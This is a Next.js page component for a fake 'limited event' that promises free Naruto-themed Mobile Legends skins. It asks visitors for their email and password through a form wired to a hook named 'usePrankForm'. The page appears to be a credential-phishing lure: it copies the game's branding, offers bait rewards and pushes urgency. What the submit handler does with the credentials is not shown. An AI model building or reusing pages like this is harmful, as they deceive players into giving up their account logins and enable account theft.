"use client"; // This directive makes it a Client Component

import Head from "next/head"; // Still useful for setting page title
// import Image from 'next/image'; // Uncomment if you add logos
import { usePrankForm } from "@/app/hooks/usePrankForm"; // Assuming alias for hooks
import { PrankFormComponent } from "@/app/components/PrankForm"; // Assuming alias for components

export default function ClaimPage() {
  const {
    email,
    setEmail,
    password,
    setPassword,
    isLoading,
    error,
    handleSubmit,
  } = usePrankForm();

  return (
    <>
      <Head>
        <title>ML Naruto Skins - Claim Your Limited Event Reward!</title>
        <meta
          name="description"
          content="Enter the event to claim your exclusive Naruto series skins for Mobile Legends!"
        />
      </Head>
      <div className="min-h-screen bg-naruto-darkblue flex flex-col items-center justify-center p-4 text-white">
        <div className="bg-ml-blue p-8 rounded-lg shadow-2xl w-full max-w-md transform transition-all hover:scale-105">
          <div className="text-center mb-6">
            {/* Example for adding an image:
            <Image
              src="/path-to-your/ml-logo.png"
              alt="Mobile Legends Logo"
              width={80}
              height={80}
              className="mx-auto mb-2" // Example styling
            /> */}
            <h1 className="text-3xl font-bold text-naruto-orange mb-2">
              Exclusive Naruto Skins!
            </h1>
            <p className="text-ml-gold">
              Log in to claim your FREE Naruto Series Skins for Mobile Legends!
            </p>
          </div>
          <PrankFormComponent
            email={email}
            onEmailChange={setEmail} // Assuming PrankFormComponent expects onEmailChange
            password={password}
            onPasswordChange={setPassword} // Assuming PrankFormComponent expects onPasswordChange
            isLoading={isLoading}
            error={error}
            onSubmit={handleSubmit}
          />
          <p className="mt-6 text-xs text-center text-gray-400">
            This event is for a limited time only. Don't miss out!
          </p>
        </div>
      </div>
    </>
  );
}
